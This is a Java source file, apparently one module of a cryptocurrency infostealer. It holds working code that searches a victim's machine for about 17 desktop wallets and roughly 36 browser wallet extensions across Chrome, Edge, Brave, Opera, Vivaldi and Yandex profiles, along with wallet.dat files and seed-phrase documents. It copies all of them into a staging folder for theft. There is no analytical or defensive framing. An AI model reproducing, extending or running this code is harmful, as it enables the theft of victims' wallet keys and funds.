package itzgonza.hollyshit.impl.coin;

import java.io.File;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.io.FileUtils;

import itzgonza.hollyshit.utils.utilities;

public class Wallet extends utilities {

    public static Map<String, String> path = new HashMap<>();
    public static int stealWallets = 0;

    // Desktop wallet paths
    private static final Map<String, String> DESKTOP_WALLETS = new HashMap<String, String>() {{
        put("Exodus", System.getenv("APPDATA") + "/Exodus/exodus.wallet");
        put("Atomic", System.getenv("APPDATA") + "/atomic/Local Storage/leveldb");
        put("Electrum", System.getenv("APPDATA") + "/Electrum/wallets");
        put("Ethereum", System.getenv("APPDATA") + "/Ethereum/keystore");
        put("Bytecoin", System.getenv("APPDATA") + "/bytecoin");
        put("Zcash", System.getenv("APPDATA") + "/Zcash");
        put("Armory", System.getenv("APPDATA") + "/Armory");
        put("Jaxx", System.getenv("APPDATA") + "/com.liberty.jaxx/IndexedDB");
        put("Coinomi", System.getenv("LOCALAPPDATA") + "/Coinomi/Coinomi/wallets");
        put("Guarda", System.getenv("APPDATA") + "/Guarda/Local Storage/leveldb");
        put("Wasabi", System.getenv("APPDATA") + "/WalletWasabi/Client/Wallets");
        put("Bitcoin Core", System.getenv("APPDATA") + "/Bitcoin/wallets");
        put("Litecoin Core", System.getenv("APPDATA") + "/Litecoin/wallets");
        put("Dash Core", System.getenv("APPDATA") + "/DashCore/wallets");
        put("Dogecoin Core", System.getenv("APPDATA") + "/Dogecoin/wallets");
        put("Monero", System.getenv("APPDATA") + "/Monero");
        put("MultiBit", System.getenv("APPDATA") + "/MultiBit");
    }};

    // Browser extension wallets
    private static final Map<String, String> BROWSER_WALLETS = new HashMap<String, String>() {{
        put("MetaMask", "nkbihfbeogaeaoehlefnkodbefgpgknn");
        put("Phantom", "bfnaelmomeimhlpmgjnjophhpkkoljpa");
        put("Coinbase", "hnfanknocfeofbddgcijnmhnfnkdnaad");
        put("Binance", "fhbohimaelbohpjbbldcngcnapndodjp");
        put("Trust Wallet", "egjidjbpglichdcondbcbdnbeeppgdph");
        put("Ronin", "fnjhmkhhmkbjkkabndcnnogagogbneec");
        put("Exodus", "aholpfdialjgjfhomihkjbmgjidlcdno");
        put("Coin98", "aeachknmefphepccionboohckonoeemg");
        put("TronLink", "ibnejdfjmmkpcnlpebklmnkoeoihofec");
        put("Keplr", "dmkamcknogkgcdfhhbddcghachkejeap");
        put("Terra Station", "aiifbnbfobpmeekipheeijimdpnlpgpp");
        put("Nami", "lpfcbjknijpeeillifnkikgncikgfhdo");
        put("Yoroi", "ffnbelfdoeiohenkjibnmadjiehjhajb");
        put("XDEFI", "hmeobnfnfcmdkdcmlblgagmfpfboieaf");
        put("Braavos", "jnlgamecbpmbajjfhmmmlhejkemejdma");
        put("Martian Aptos", "efbglgofoippbgcjepnhiblaibcnclgk");
        put("Rabby", "acmacodkjbdgmoleebolmdjonilkdbch");
        put("OKX", "mcohilncbfahbmgdjkbpemcciiolgcge");
        put("SafePal", "lgmpcpglpngdoalbgeoldeajfclnhafa");
        put("Solflare", "bhhhlbepdkbapadjdnnojkbgioiodbic");
        put("Aptos", "idmhhkaonnbbebacpogfeihidclpcnon");
        put("Sui", "opcgpfpkfmghibhnllocicajlsnljmdo");
        put("Martian SUI", "efbglgofoippbgcjepnhiblaibcnclgk");
        put("Petra", "pbjbmkpebcbiibdclnmhlbhdilnoikoc");
        put("Rise", "jofmcmbhceiddmhkfcfkapnblonofmjp");
        put("Pontem", "phkbamefinggnoigpghngxppkfbeihob");
        put("Fewcha", "ebfidpplhcocghccdiehnchakobpnehf");
        put("Math", "afbcbajneidbfecihhlopbbfomceobpk");
        put("BitKeep", "jiidiaalihhjjbhfhocnbfenbdienpbb");
        put("Venom", "onpfnoaajamaakeoeabpfihgkkbeabbe");
        put("Argent", "mglpedomakidfdajkibbebeidppneidp");
        put("Kaikas", "jblndliolpokaocpabcmecpcpbanigne");
        put("Clover", "nhnkbkgjghgcigobhcaemgecdihokibi");
        put("ZilPay", "klnaejjgbibmccphhbgeacocnnehhcll");
        put("Harmony", "fnnegphlobjdpkhecapijimnnoicocen");
        put("Fantom", "bfnaelmomeimhlpmgjnjophhpkkoljpa");

    }};

    // Browser paths
    private static final Map<String, String> BROWSER_BASES = new HashMap<String, String>() {{
        put("Chrome", System.getenv("LOCALAPPDATA") + "/Google/Chrome/User Data");
        put("Edge", System.getenv("LOCALAPPDATA") + "/Microsoft/Edge/User Data");
        put("Brave", System.getenv("LOCALAPPDATA") + "/BraveSoftware/Brave-Browser/User Data");
        put("Opera", System.getenv("APPDATA") + "/Opera Software/Opera Stable");
        put("OperaGX", System.getenv("APPDATA") + "/Opera Software/Opera GX Stable");
        put("Vivaldi", System.getenv("LOCALAPPDATA") + "/Vivaldi/User Data");
        put("Yandex", System.getenv("LOCALAPPDATA") + "/Yandex/YandexBrowser/User Data");
    }};

    public void initialize() {
        // Collect desktop wallets
        for (Map.Entry<String, String> entry : DESKTOP_WALLETS.entrySet()) {
            String walletName = entry.getKey();
            String walletPath = entry.getValue();
            File walletFile = new File(walletPath);
            
            if (walletFile.exists() && !isOverLimit()) {
                try {
                    File destDir = new File(getFolder() + "/wallet/desktop/" + walletName);
                    if (walletFile.isDirectory()) {
                        // Wallets are typically small leveldb files. If > 10MB, skip to avoid bloat.
                        if (getFolderSize(walletFile) < 10 * 1024 * 1024) {
                            FileUtils.copyDirectory(walletFile, destDir);
                            stealWallets++;
                            content.add("wallet");
                        }
                    } else {
                        destDir.getParentFile().mkdirs();
                        FileUtils.copyFile(walletFile, destDir);
                        stealWallets++;
                        content.add("wallet");
                    }
                } catch (Exception ignored) {}
            }
        }
        
        // Collect browser extension wallets
        for (Map.Entry<String, String> browserEntry : BROWSER_BASES.entrySet()) {
            String browserName = browserEntry.getKey();
            String browserBase = browserEntry.getValue();
            File browserDir = new File(browserBase);
            if (!browserDir.exists()) continue;
            
            // Tüm alt klasörleri tara (Default, Profile 1, 2, 3... vs)
            File[] profiles = browserDir.listFiles(File::isDirectory);
            if (profiles == null) continue;

            for (File profileDir : profiles) {
                File extensionsPath = new File(profileDir, "Local Extension Settings");
                if (!extensionsPath.exists()) {
                    // Bazı tarayıcılarda yol farklı olabilir
                    extensionsPath = new File(profileDir, "Extension State");
                }
                if (!extensionsPath.exists()) continue;
                
                for (Map.Entry<String, String> walletEntry : BROWSER_WALLETS.entrySet()) {
                    String walletName = walletEntry.getKey();
                    String extensionId = walletEntry.getValue();
                    File extensionDir = new File(extensionsPath, extensionId);
                    
                    if (extensionDir.exists() && !isOverLimit()) {
                        try {
                            if (getFolderSize(extensionDir) < 10 * 1024 * 1024) {
                                File destDir = new File(getFolder() + "/wallet/browser/" + browserName + "_" + profileDir.getName() + "_" + walletName);
                                FileUtils.copyDirectory(extensionDir, destDir);
                                stealWallets++;
                                content.add("wallet");
                                path.put(walletName.toLowerCase(), extensionDir.getAbsolutePath());
                            }
                        } catch (Exception ignored) {}
                    }
                }
            }
        }
        
        // Find wallet.dat files
        findWalletDatFiles();
        
        // Find seed phrase files
        findSeedPhraseFiles();
    }
    
    private void findWalletDatFiles() {
        String[] searchPaths = {
            System.getenv("APPDATA") + "/Bitcoin",
            System.getenv("APPDATA") + "/Litecoin",
            System.getenv("APPDATA") + "/Dogecoin",
            System.getenv("APPDATA") + "/DashCore"
        };
        
        for (String searchPath : searchPaths) {
            File dir = new File(searchPath);
            if (!dir.exists()) continue;
            
            searchForFile(dir, "wallet.dat");
        }
    }
    
    private void findSeedPhraseFiles() {
        String[] searchPaths = {
            System.getProperty("user.home") + "/Desktop",
            System.getProperty("user.home") + "/Documents",
            System.getProperty("user.home") + "/Downloads"
        };
        
        String[] seedKeywords = {"seed", "mnemonic", "recovery", "private", "backup", "wallet"};
        
        for (String searchPath : searchPaths) {
            File dir = new File(searchPath);
            if (!dir.exists()) continue;
            
            File[] files = dir.listFiles();
            if (files == null) continue;
            
            for (File file : files) {
                if (!file.isFile()) continue;
                String name = file.getName().toLowerCase();
                
                for (String keyword : seedKeywords) {
                    if (name.contains(keyword) && (name.endsWith(".txt") || name.endsWith(".doc") || name.endsWith(".docx"))) {
                        try {
                            File destDir = new File(getFolder() + "/wallet/seeds/");
                            destDir.mkdirs();
                            FileUtils.copyFile(file, new File(destDir, file.getName()));
                            stealWallets++;
                            content.add("wallet");
                        } catch (Exception ignored) {}
                        break;
                    }
                }
            }
        }
    }
    
    private void searchForFile(File dir, String fileName) {
        File[] files = dir.listFiles();
        if (files == null) return;
        
        for (File file : files) {
            if (file.isDirectory()) {
                searchForFile(file, fileName);
            } else if (file.getName().equalsIgnoreCase(fileName)) {
                try {
                    File destDir = new File(getFolder() + "/wallet/wallet_dat/");
                    destDir.mkdirs();
                    FileUtils.copyFile(file, new File(destDir, dir.getName() + "_" + fileName));
                    stealWallets++;
                    content.add("wallet");
                } catch (Exception ignored) {}
            }
        }
    }
}